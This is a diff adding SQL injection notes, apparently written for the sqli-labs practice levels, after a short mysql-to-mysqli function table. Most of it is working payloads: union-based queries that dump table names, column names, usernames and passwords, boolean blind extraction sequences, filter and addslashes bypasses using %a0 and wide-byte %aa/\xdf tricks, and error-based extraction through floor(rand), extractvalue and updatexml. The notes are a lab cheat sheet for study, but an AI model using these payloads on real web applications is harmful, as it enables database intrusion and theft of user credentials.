@@ -1,0 +1,149 @@
+S.No 	Replace 	Replace By
+1 	mysql_query($sql) 	mysqli_query($con, $sql)
+2 	mysql_error() 	mysqli_error($con)
+3 	mysql_fetch_array($result) 	mysqli_fetch_array($result, MYSQLI_BOTH)
+5 	mysql_connect($host,$dbuser,$dbpass) 	mysqli_connect($host,$dbuser,$dbpass)
+6 	mysql_real_escape_string($value) 	mysqli_real_escape_string($con, $value)
+7 	mysql_select_db($dbname, $con) 	mysqli_select_db($con, $dbname)# 基于错误和输出的注入
+
+## get how SELECT param be enveloped
+SELECT * FROM table_name WHERE username='Raj' AND password='Chandel';
+SELECT * FROM table_name WHERE username=('Raj') AND password=('Chandel');
+SELECT * FROM table_name WHERE username="Raj" AND password="Chandel";
+SELECT * FROM table_name WHERE username=("Raj") AND password=("Chandel");
+
+## make it work or wrong
+?id=1
+?id=1\
+
+## get what is SELECTed
+?id=1' order by 1 #                NO ERROR
+?id=1' order by 2 #                NO ERROR
+?id=1' order by 3 #                NO ERROR
+?id=1' order by 4 #                ERROR!!!
+
+## union injection
+?id=-1' union select 1,2,3 #
+?id=-1' union select 'a','b','c' #
+
+## 基于联合查询的SQL注入
+Variable/function	Output
+user()	Current User
+database()	Current Database
+version()	Database Version
+schema()	Current Database
+UUID()	System UUID Key
+current_user()	Current User
+system_user()	Current System User
+session_user()	Session User
+@@hostname	Current Hostname
+@@tmpdir	Temporary Directory
+@@datadir	Data Directory
+@@version	Version of Database
+@@basedir	Base Directory
+@@GLOBAL.have_symlink	Check if symlink is Enabled or Disabled
+@@GLOBAL.have_ssl	Check if it SSL is available
+
+## get a certain table
+?id=-1' union select 1,table_name,3 from information_schema.tables where table_schema=database() limit 2,1 --+
+
+## get all tables
+?id=-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+
+
+## get all column names in a certain table
+?id=-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users' --+
+
+## get information in a certain table
+?id=-1' union select 1,group_concat(username),3 from users --+
+?id=-1' union select 1,group_concat(password),3 from users --+
+
+
+# 基于布尔代数的盲注
+
+## make it work or wrong
+?id=1' AND 1=1 --+
+?id=1' AND 1=0 --+
+
+## get length of database()
+?id=1' and length(database())<10 --+
+?id=1' and length(database())<5 --+
+?id=1' and length(database())<8 --+
+?id=1' and length(database())<9 --+
+?id=1' and length(database())=8 --+
+
+## get name of database()
+?id=1' and ascii(substr(database(),1,1))>100 --+
+?id=1' and ascii(substr(database(),1,1))>120 --+
+?id=1' and ascii(substr(database(),1,1))>110 --+
+?id=1' and ascii(substr(database(),1,1))>115 --+
+?id=1' and ascii(substr(database(),1,1))=115 --+
+?id=1' and ascii(substr(database(),2,1))>100 --+
+
+## get tables of a certain database
+?id=1' and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))>5 --+
+?id=1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))>100 --+
+
+## get columns of a certain table
+?id=1' and length((select column_name from information_schema.columns where table_name=['users'] limit 0,1))>5 --+
+?id=1' and ascii(substr((select column_name from information_schema.columns where table_name=['users'] limit 0,1),1,1))>50 --+
+
+## get information of a certain column
+?id=1' and length((select [username] from [users] limit 0,1))<5 --+
+?id=1' and ascii(substr((select [username] from [users] limit 0,1),1,1))>50 --+
+
+01. basic : ?id=0' union select --+
+02. basic : ?id=0 union select --+
+03. basic : ?id=0') union select --+
+04. basic : ?id=0") union select --+
+05. Blind Injection: ?id=1' and database() regexp '^[a-z]{1,9}' --+
+06. Blind Injection: ?id=1" and database() regexp '^[a-z]{1,9}' --+
+07. select into outfile
+08. select into outfile
+09. select into outfile
+10. select into outfile
+11. Form injection '
+12. Form injection ")
+13. Form injection ') && into outfile
+14. Form injection "  && into outfile
+15. Form injection    && into outfile && guess '
+16. Form injection    && into outfile && guess ")
+17. Todo: 网站对输入进行了过滤，目前尚无办法。 Update Query- Error based -String
+18. Todo: Header Injection-Error Based-String
+19. Todo: Header Injection-Referer-Error Based-String
+20. Todo: Form injection Cookie Injection-Error Based-String
+21. Todo: Form injection Cookie Injection-Error Based-complex-String
+22. Todo: Form injection Cookie Injection-Error Based-Double Quotes-String
+23. Error Based - no comments : ?id=-1' union select 1,2,3 '1
+24. Todo: Second Degree Injections
+25. Filter bypass. ascii %xx : ?id=0' union select 1,2,3 'name_of_3
+26. Filter bypass. ascii %xx : ?id=0'%a0union%a0select%a01,database(),3%a0%26%26'1=1
+26a Filter bypass. ascii %xx : ?id=0')%a0union%a0select%a01,database(),('3
+27. Filter bypass. ascii %xx : ?id=0'%a0uniOn%a0SelEct%a01,2,3%a0'a
+27a Filter bypass. ascii %xx : ?id=0"%a0uniOn%a0SelEct%a01,2,3%a0"a
+28. Filter bypass. ascii %xx : ?id=0')%a0union%a0select%a01,2,3||('a
+28a Filter bypass. ascii %xx : ?id=0') union%a0select 1,2,3 || ('a
+29. ?id=-1'  union select 1,2,3 'a
+30. ?id=-1"  union select 1,2,3 "a
+31. ?id=0") union select 1,2,3 --+
+32. Bypass addslashes() : ?id=0%aa' union select 1,version(),3 --+
+33. Bypass addslashes() : ?id=0%aa' union select 1,version(),3 --+
+34. Bypass AddSLASHES() : python -c "print \"\xdf' union select 1,2 #\""
+35. why care for addslashes() : ?id=0 union select 1,2,3 --+
+36. Todo : mysqli_real_escape_string()
+37. Todo : mysqli_real_escape_string()
+38. stacked Query : ?id=-1' union select 1,2,3 --+
+39. stacked Query Intiger type : ?id=-1  union select 1,2,3 --+
+40. stacked Query String type blind : ?id=-1') union select 1,2,3 --+
+41. stacked Query Intiger type blind: ?id=-1 union select 1,2,3 --+
+42. Todo : mysqli_real_escape_string()
+42. Todo : what to do?
+
+
+www.cnblogs.com/lcamry
+select count(*), concat_ws(':', database(), floor(rand(0)*2)) a from information_schema.columns group by a;
+select count(*) from information_schema.tables group by concat_ws(':', version(), floor(rand(0)*2));
+select count(*) from (select 1 union select 2 union select 3) a group by concat_ws(":", @@basedir, floor(rand(0)*2));
+select min(@a:=1) from information_schema.tables group by concat_ws(":", version(),@a:=(@a+1)%2);
+select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x;
+select extractvalue(1,concat(":",(select @@version), ":"));
+select updatexml(1,concat(":",(select version()),":"),1);
